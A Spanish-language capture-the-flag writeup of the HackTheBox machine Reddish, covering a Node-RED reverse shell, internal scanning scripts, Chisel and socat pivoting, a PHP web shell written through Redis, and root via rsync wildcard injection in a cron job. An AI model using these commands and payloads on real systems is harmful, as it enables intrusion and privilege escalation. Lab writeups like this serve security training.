---
layout: single
title: Reddish - HackTheBox
excerpt: "En este writeup se documenta la explotación de la máquina Reddish en HackTheBox, destacando vulnerabilidades en Node-RED y Redis, así como el uso de técnicas avanzadas de pivoting con Chisel y socat. Se detalla el proceso de escalada de privilegios a través de la explotación de una tarea cron vulnerable, logrando acceso completo al sistema. Este análisis resalta la importancia de proteger servicios expuestos y restringir accesos en redes internas para evitar compromisos críticos."
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/Reddish/Reddish.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
tags:  
  - Pivoting
  - Chisel
  - Socat
  - Redis
  - Node-red
  - Cronjob
---

![](/assets/images/Reddish/Reddish.png){:style="max-width:450px;height:auto;"}

## Resumen

En este writeup se documenta la explotación de la máquina Reddish en HackTheBox, destacando vulnerabilidades en Node-RED y el uso de técnicas de pivoting para moverse dentro de la red interna.

### 1. Reconocimiento Inicial

- Escaneo de puertos con nmap detecta el puerto 1880 expuesto.
- El servicio web no responde a GET, pero sí a POST, revelando una ruta /red/{ip}.
- Se identifica Node-RED, una plataforma de programación visual vulnerable.

### 2. Explotación de Node-RED

- Se configura una shell inversa usando nodos TCP en Node-RED.
- Se obtiene acceso inicial con un usuario privilegiado.

### 3. Enumeración Interna

- Se ejecuta un script en bash para descubrir hosts internos.
- Se identifican direcciones IP en dos subredes (172.18.0.0/24 y 172.19.0.0/24).
- Se realiza un escaneo de puertos en los hosts detectados.

### 4. Pivoting con Chisel

- Se usa Chisel para establecer un túnel reverso y acceder a servicios internos.
- Se descubre un servidor Redis en 172.19.0.3:6379.
- Se encuentra un servidor HTTP en 172.19.0.2:80.

### 5. Explotación de Redis y Escalada

- Se sube un archivo PHP mediante Redis para obtener una web shell.
- Se usa socat para redirigir la shell de www hacia el atacante.
- Se obtiene acceso completo al sistema mediante una reverse shell en www.

## Reconocimiento

El servidor expone un solo servicio web en el puerto 1880.

Al realizar un escaneo de puertos con herramientas como nmap, podemos ver que el único puerto abierto es el 1880:

![](/assets/images/Reddish/Reconocimiento-Puertos.png)

En este caso, el puerto está abierto, si lanzamos unos scripts básicos de reconocimiento de nmap:

![](/assets/images/Reddish/Reconocimiento-Scripts.png)

No nos devolverá nada,si intentamos acceder mediante el navegador nos dirá que con el método GET no podemos acceder.

![](/assets/images/Reddish/Metodo-Get.png)

Sin embargo, al realizar una solicitud POST nos dirá lo siguiente:

![](/assets/images/Reddish/Metodo-Post.png)

## Página Web

Y ahora podemos acceder a una ruta interesante /red/{id} que nos llevará a descubrir un servicio de programación visual vulnerable.

![](/assets/images/Reddish/Node-Red.png)

La herramienta de programación visual que se encuentra en el puerto 1880 es Node-RED, una plataforma basada en flujos que permite la creación de aplicaciones IoT y automatización.

Node-RED es vulnerable en esta máquina, lo que nos permite obtener acceso a la consola del servidor. Esto lo conseguimos tras realizar las siguientes acciones:

### Paso 1: Escucha

Primero, establecemos nuestra escucha en la máquina atacante para obtener el acceso de reversa a través de nc.

![](/assets/images/Reddish/Escucha-Node-Red.png)

### Paso 2: Conectar los Nodos

Añadimos los nodos adecuados para establecer la conexión.

![](/assets/images/Reddish/Node-Red-Nodos.png)

### Paso 3: Configurar TCP Input:

![](/assets/images/Reddish/TCP-Input.png)

### Paso 4: Configurar TCP Output:

![](/assets/images/Reddish/TCP-Output.png)

### Paso 5: Deploy

![](/assets/images/Reddish/Node-Red-Nodos-Listo.png)

![](/assets/images/Reddish/Node-Red-Shell.png)

## Escalada de Privilegios

Una vez dentro del sistema con Node-RED, el siguiente paso fue hacer una reverse shell con Perl (ya que estaba en el sistema).

![](/assets/images/Reddish/RevShell.png)

Explorando un poco el sistema, podemos descubrir otros sistemas en la misma red. Esto se logró utilizando un script en bash para enumerar los hosts activos en los sistemas internos descubiertos.

## Script de Descubrimiento de Hosts

El script que creamos para enumerar hosts activos en las subredes fue el siguiente:

    #!/bin/bash
    hosts=("172.18.0" "172.19.0")

    for host in ${hosts[@]}; do
      echo -e "\n[+] Enumerating $host.0/24\n"
      for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 $host.$i" &> /dev/null && echo "[+] Host $host.$i - ACTIVE" &
      done; wait
    done

Este script realiza un escaneo para verificar qué direcciones IP están activas dentro de las subredes 172.18.0 y 172.19.0 .

![](/assets/images/Reddish/Hosts.png)

## Script de Descubrimiento de Puertos

Una vez tenemos los hosts, vamos a escanear los puertos que tienen abiertos. Con el siguiente script:

    #!/bin/bash

    hosts=("172.18.0.1" "172.19.0.1" "172.19.0.2" "172.19.0.3")

    for host in ${hosts[@]}; do
      echo -e "\n[+] Scanning ports on $host\n"
      for port in $(seq 1 10000); do
        timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2> /dev/null && echo -e "\t[*] Port $port - OPEN" &
      done; wait
    done

Este script va a mandar una cadena vacia al host y a un puerto (de entre 1 a 10000) y el que de respuesta es el que está abierto.

![](/assets/images/Reddish/Ports.png)

## Túnel con Chisel

Una vez que descubrimos los hosts, tuvimos que usar un túnel para poder acceder al puerto 80 del host 172.19.0.2 ya que no es accesible desde nuestra máquina.

Usamos Chisel, una herramienta de proxy, para establecer un túnel TCP inverso:

Nos ponemos por escucha desde nuestra máquina:

    ./chisel server --reverse -p 1234

Ahora nos dirijimos a la máquina víctima para ejecutar lo siguiente y entablar el túnel con chisel:

![](/assets/images/Reddish/Chisel.png)

Esto nos permitió ver puertos internos que estaban ocultos y que de otro modo no habríamos podido explorar.

## Descubrimiento Redis

Una vez que descubrimos que el puerto 6379 del host 172.19.0.3 estaba abierto, lanzamos unos scripts básicos de reconocimiento, para averiguar que servicio estaba corriendo en el:

![](/assets/images/Reddish/Nmap-Redis.png)

## Página Web Redis

Si nos dirigimos al navegador, para ver el contenido de redis, nos encontraremos con una web por defecto:

![](/assets/images/Reddish/Page-Redis.png)

Si inspeccionamos el código fuente, nos encontraremos con unas funciones que hacen referencia a unas rutas:

![](/assets/images/Reddish/Page-Inspect-Redis.png)

Si nos dirigimos a esa ruta directamente, nos dira que no tenemos permiso para acceder a ese recurso:

![](/assets/images/Reddish/Forbidden-Redis-Page.png)

## Reverse Shell con socat

Una vez sabemos que se está ejecutando Redis, aprovechamos esta vulnerabilidad para cargar un archivo PHP que nos permitió ejecutar una reverse shell, este es el archivo PHP:

    <?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    ?>

Haciendo uso de la ruta anteriormente obtenida, subimos el archivo PHP a través de Redis con el siguiente comando:

    redis-cli -h 127.0.0.1 flushall
    cat cmd.php | redis-cli -h 127.0.0.1 -x set crackit
    redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
    redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
    redis-cli -h 127.0.0.1 save

Para completar la explotación, utilizamos socat para establecer una reverse shell en la máquina que corría Node-RED. Este paso se llevó a cabo configurando un túnel inverso que conectaba nuestra máquina local con la máquina de Node-RED, permitiéndonos ejecutar comandos remotos.

    ./socat TCP-LISTEN:4545,fork tcp:10.10.14.6:5555 &

## Escalada de Privilegios
### Explotación de la tarea cron 'Backup.sh'
Durante la exploración del sistema, se identificó un script cron ejecutado como root, /backup/backup.sh, que se ejecutaba periódicamente.

![](/assets/images/Reddish/Backup-sh.png)

![](/assets/images/Reddish/Backup-sh-Content.png)

### Abuso de rsync para Escalada

Aprovechamos un error del comando 'rsync -a *.rdb', gracias a ello y que tenemos la capacidad de escritura en '/var/www/html/f187a0ec71ce99642e4f0afbd441a68b', podemos inyectar un archivo .rdb con comandos maliciosos y lograr ejecutar un comando chmod para hacer el binario  '/bin/bash' setuid, dándonos privilegios de root.

    echo 'chmod u+s /bin/bash' > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/test.rdb
    cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/ && touch -- '-e sh test.rdb' && cd /tmp

![](/assets/images/Reddish/setuid-bash.png)

La bandera 'user', se encuentra en '/home/somaro':

    dfc0c6503d1b36fa17b0be628745971f

En la tarea cron anterior 'backup.sh', podemos observar que hace referencia a otra máquina, en el puerto 873:

    rsync rsync://backup:873/src/etc/passwd

Si observamos el archivo que solicita, tiene pinta de ser una montura de la máquina real:

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    bash-4.3# cat passwd 
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
    systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false

Pasamos los archivos necesarios para una reverse shell con socat hasta nuestra máquina real. Una vez dentro del equipo:

![](/assets/images/Reddish/Machine-backup.png)

### Montando la partición para obtener la bandera 'root'

Si observamos las particiones, podemos ver que pesa '1.2 GB':

![](/assets/images/Reddish/Parted.png)

Si observamos que hay dentro, podemos ver que no hay archivos con ese peso:

![](/assets/images/Reddish/View-Parted.png)

Si ejecutamos 'du -hc /backup', podemos ver el tamaño de los archivos que estamos viendo:

![](/assets/images/Reddish/Du-Parted.png)

Esto, nos dice que obviamente no llega al tamaño antes mencionado. Vamos a crearnos una carpeta en '/tmp' para montar la partición:

    mkdir test && cd test && mount /dev/sda2 .

Contiene 3 carpetas, en una están las 2 banderas, la que nos falta es la de 'Root':

    0a29314934253afa70ba9523ec8328b0

### Conclusión

A lo largo de este análisis, se logró tomar el control de la máquina objetivo a través de la explotación de vulnerabilidades en servicios como Node-RED y Redis. Además, aprovechamos la red interna y las debilidades en la configuración de seguridad para escalar privilegios y obtener las banderas.

Este enfoque demuestra la importancia de asegurar servicios como Node-RED y Redis, así como de implementar prácticas robustas de monitoreo y protección de redes internas.
